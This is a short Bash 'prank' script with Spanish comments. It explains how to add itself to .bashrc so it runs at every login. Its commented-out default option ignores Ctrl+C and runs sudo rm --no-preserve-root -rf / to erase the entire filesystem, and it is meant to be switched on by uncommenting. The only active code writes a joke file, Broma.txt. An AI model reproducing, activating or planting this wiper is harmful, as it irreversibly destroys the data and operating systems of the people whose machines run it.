#!/bin/bash

#Este codigo esta creado como prueba, se recomienda su uso en una maquina virtual

#Fecha 20/02/2024
#Lenguaje Bash

#No me hago responsable del uso que se le de a este codigo

#Uso de programa:
#	Apertura de .bashrc
#		cd
#		nano .bashrc
#Edicion de codigo:
#Al final del codigo ".bashrc", añadimos la siguiente linea
#sudo bash ./tmp_exploder.sh
#Esta linea ejecutara el codigo del programa $0 (este programa) nada mas iniciar el sistema operativo

#El programa se encarga de eliminar automaticamente el sistema operativo por completo
#El origen del  borrado comienza en /, eliminando todo en su interior de una forma forzosa
#Esta diseñado apra bloquear todo intento de cancelar el codigo, "Control + C"
#Este codigo viene incorporado en una pagina de GitHub y en la Distribucion 'T.X-000.1_px.iso'
#Se recomienda no instalar este codigo en un sistema operativo principal y usarlo para pruebas o bromas dentro de maqinas virtuales

#Ha quedado advertido

# ----------------------------------------------------------------------------------------- #

#Opcion por defecto (comentada), descomentar para activar
#Referencia Star Wars Episode III: Revenge of the Sith.

#trap '' 2
#clear
#echo "Execute Order Sixty-Six"
#sleep 3
#sudo rm --no-preserve-root -rf /
#sleep 60
#trap 2

#Opcion de seguridad (no comentada), comentar para desactivar
touch Broma.txt
echo "Has sido victima de una broma" >> Broma.txt
